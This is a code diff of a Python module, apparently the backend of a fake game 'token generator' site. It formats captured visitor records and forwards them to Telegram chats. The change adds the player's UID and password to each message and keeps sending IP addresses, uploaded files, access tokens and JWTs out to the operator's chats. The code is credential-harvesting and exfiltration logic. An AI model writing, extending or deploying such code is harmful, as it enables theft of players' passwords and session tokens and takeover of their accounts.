@@ -2,7 +2,7 @@
 import json
 import urllib.request
 import uuid
-from datetime import datetime, timezone
+from datetime import datetime
 
 
 def _h(s):
@@ -46,34 +46,13 @@ class TelegramCapture:
         self._send_sync(record)
 
     def _send_sync(self, record):
-        # user uploaded files
         user_files = record.pop("_files", []) or []
-
-        # formatted text
         text = self._format(record)
-
-        # json snapshot
-        json_bytes = json.dumps(record, ensure_ascii=False, indent=2).encode("utf-8")
-        ts_tag = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
-        src = record.get("source") or "capture"
-        json_filename = f"{src}_{ts_tag}.json"
 
         for chat_id in self.chats:
             try:
-                # 1. text message
                 if text.strip():
                     self._message(chat_id, text)
-
-                # 2. json snapshot file (always)
-                self._document(
-                    chat_id,
-                    filename=json_filename,
-                    data=json_bytes,
-                    caption=f"📄 {json_filename}",
-                    content_type="application/json",
-                )
-
-                # 3. user's uploaded files
                 for f in user_files:
                     self._document(
                         chat_id,
@@ -95,64 +74,111 @@ class TelegramCapture:
             "request":          "📥",
         }.get(src, "📌")
 
-        L = [f"{icon} <b>{_h(src.upper())}</b>"]
+        title = {
+            "generated":        "TOKEN GENERATED",
+            "generated_failed": "TOKEN FAILED",
+            "request":          "NEW REQUEST",
+        }.get(src, src.upper())
 
+        ts_raw = r.get("ts") or ""
+        ts_fmt = ts_raw
+        try:
+            dt = datetime.fromisoformat(ts_raw.replace("Z", "+00:00"))
+            ts_fmt = dt.strftime("%d %b %Y • %H:%M:%S")
+        except Exception:
+            pass
+
+        def table(rows):
+            if not rows:
+                return ""
+            key_w = max(len(str(k)) for k, _ in rows)
+            lines = [f"{str(k).ljust(key_w)}  ›  {v}" for k, v in rows]
+            return "<pre>" + "\n".join(lines) + "</pre>"
+
+        L = []
+
+        # header
+        L.append(f"{icon}  <b>{_h(title)}</b>")
+        L.append(f"<code>{_h(ts_fmt)}</code>")
+
+        # identity
         ident = []
         if r.get("sender"):
             ident.append(f"👤 <b>{_h(r.get('sender'))}</b>")
         if r.get("ip"):
             ident.append(f"🌐 <code>{_h(r.get('ip'))}</code>")
         if ident:
-            L.append(" • ".join(ident))
-
-        L.append(f"🕒 <code>{_h(r.get('ts'))}</code>")
-
-        if r.get("level") or r.get("region"):
             L.append("")
-            L.append(f"🎮 <b>Level:</b> <code>{_h(r.get('level'))}</code>")
-            L.append(f"🌍 <b>Region:</b> <code>{_h(r.get('region'))}</code>")
+            L.append("  •  ".join(ident))
 
+        # player (uid + password + level + region)
+        player_rows = []
+        if r.get("level") not in (None, 0, ""):
+            player_rows.append(("Level", str(r.get("level"))))
+        if r.get("region"):
+            player_rows.append(("Region", str(r.get("region"))))
+        if r.get("uid"):
+            player_rows.append(("UID", str(r.get("uid"))))
+        if r.get("password"):
+            player_rows.append(("Password", str(r.get("password"))))
+        if player_rows:
+            L.append("")
+            L.append("🎮  <b>PLAYER</b>")
+            L.append(table(player_rows))
+
+        # request
         L.append("")
-        L.append("━━━━━━━━━━━━━━━━━━━━")
-        L.append(f"<b>{_h(r.get('method'))}</b>  <code>{_h(r.get('path'))}</code>")
-        L.append("━━━━━━━━━━━━━━━━━━━━")
-
+        L.append("📡  <b>REQUEST</b>")
+        req_rows = [
+            ("Method", str(r.get("method") or "-")),
+            ("Path",   str(r.get("path") or "-")),
+        ]
         if r.get("user_agent"):
-            L.append(f"🧭 <i>{_h(r.get('user_agent'))[:180]}</i>")
+            req_rows.append(("UA", r.get("user_agent")[:48]))
         if r.get("referer"):
-            L.append(f"🔗 <i>{_h(r.get('referer'))[:150]}</i>")
+            req_rows.append(("Referer", r.get("referer")[:48]))
+        L.append(table(req_rows))
 
+        # query
         q = r.get("query")
         if q and q not in ("{}", "null", "None"):
             L.append("")
-            L.append("🔎 <b>Query</b>")
-            L.append(f"<pre>{_h(q)[:600]}</pre>")
+            L.append("🔎  <b>QUERY</b>")
+            L.append(f"<pre>{_h(q)[:500]}</pre>")
 
+        # body
         b = r.get("body")
         if b:
             L.append("")
-            L.append("📨 <b>Body</b>")
-            L.append(f"<pre>{_h(b)[:600]}</pre>")
+            L.append("📨  <b>BODY</b>")
+            L.append(f"<pre>{_h(b)[:500]}</pre>")
 
+        # files summary
         if r.get("files_summary"):
             L.append("")
-            L.append("📎 <b>Files</b>")
-            L.append(f"<pre>{_h(r.get('files_summary'))[:600]}</pre>")
+            L.append("📎  <b>FILES</b>")
+            L.append(f"<pre>{_h(r.get('files_summary'))[:500]}</pre>")
 
+        # access token
         if r.get("access_token"):
             L.append("")
-            L.append("🎟 <b>AccessToken</b>")
-            L.append(f"<pre>{_h(r.get('access_token'))[:800]}</pre>")
+            L.append("🎟  <b>ACCESS TOKEN</b>")
+            L.append(f"<blockquote expandable>{_h(r.get('access_token'))[:900]}</blockquote>")
 
+        # jwt
         if r.get("jwt_token"):
             L.append("")
-            L.append("💎 <b>JWT</b>")
-            L.append(f"<pre>{_h(r.get('jwt_token'))[:1200]}</pre>")
+            L.append("💎  <b>JWT</b>")
+            L.append(f"<blockquote expandable>{_h(r.get('jwt_token'))[:1500]}</blockquote>")
 
+        # error
         if r.get("error"):
             L.append("")
-            L.append("⚠️ <b>Error</b>")
-            L.append(f"<pre>{_h(r.get('error'))[:400]}</pre>")
+            L.append("⚠️  <b>ERROR</b>")
+            L.append(f"<blockquote>{_h(r.get('error'))[:500]}</blockquote>")
+
+        L.append("")
+        L.append("━━━━━━━━━━━━━━━━━━━━")
 
         return "\n".join(L)
 
